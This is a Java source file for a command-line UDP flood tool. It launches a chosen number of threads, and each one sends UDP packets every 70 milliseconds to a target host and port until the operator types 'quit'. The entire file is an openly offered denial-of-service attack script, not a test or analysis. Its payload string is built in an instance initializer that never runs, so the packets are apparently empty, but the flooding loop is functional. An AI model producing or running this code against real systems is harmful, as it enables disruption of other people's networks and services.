package com.find1x.jnetcatch.udpattack;

import java.net.*;
import java.io.*;

public class UDPFloodAttack {
	private static final String usage = "Usage:java UDPFloodAttack <target> <port> <the number of attack threads>";
	private static String msg = new String();
	{
		StringBuffer sbuf = new StringBuffer();
		for (int i = 0; i < 512; ++i)
			sbuf.append("a");
		msg = sbuf.toString();
	}

	public static void main(String[] args) {
		if (args.length != 3) {
			System.out.println(usage);
			System.out.println("The program will exit.");
			System.exit(0);
		}
		Thread[] attackThreads = new Thread[1];
		try {
			attackThreads = new Thread[Integer.parseInt(args[2])];
		} catch (NumberFormatException e) {
			System.err.println("Illegal Arguments!");
			System.exit(1);
		}
		try {
			for (int i = 0; i < attackThreads.length; ++i)
				attackThreads[i] = new UDPFloodAttackThread(msg,
						InetAddress.getByName(args[0]),
						Integer.parseInt(args[1]));
		} catch (Exception e) {
			System.err.println("Illegal Arguments!");
			System.exit(1);
		}
		for (int i = 0; i < attackThreads.length; ++i)
			attackThreads[i].start();
		System.out.println("Enter \'quit\' to exit.");
		BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
		String cmd = new String();
		try {
			while (!cmd.equals("quit"))
				cmd = br.readLine();
			br.close();
		} catch (IOException e) {
		}
		for (Thread t : attackThreads)
			t.stop();
	}
}

class UDPFloodAttackThread extends Thread {
	private DatagramPacket dpacket;
	private DatagramSocket dsocket;

	public UDPFloodAttackThread(String msg, InetAddress addr, int port) {
		dpacket = new DatagramPacket(msg.getBytes(), msg.getBytes().length,
				addr, port);
		try {
			dsocket = new DatagramSocket();
		} catch (SocketException e) {
			System.err.println("Cannot create an attack therad!");
			stop();
		}
		System.out.println("Finish creating an attack thread.");
	}

	public void run() {
		try {
			while (true) {
				dsocket.send(dpacket);
				sleep(70);
			}
		} catch (IOException e1) {
			System.err.println("Failed to send a packet.");
			System.err.println("A thread will be terminated.");
			stop();
		} catch (InterruptedException e2) {
			System.err.println("Failed to send a packet.");
			System.err.println("A thread will be terminated.");
			stop();
		}
	}

	public void finalize() {
		dsocket.close();
	}
}
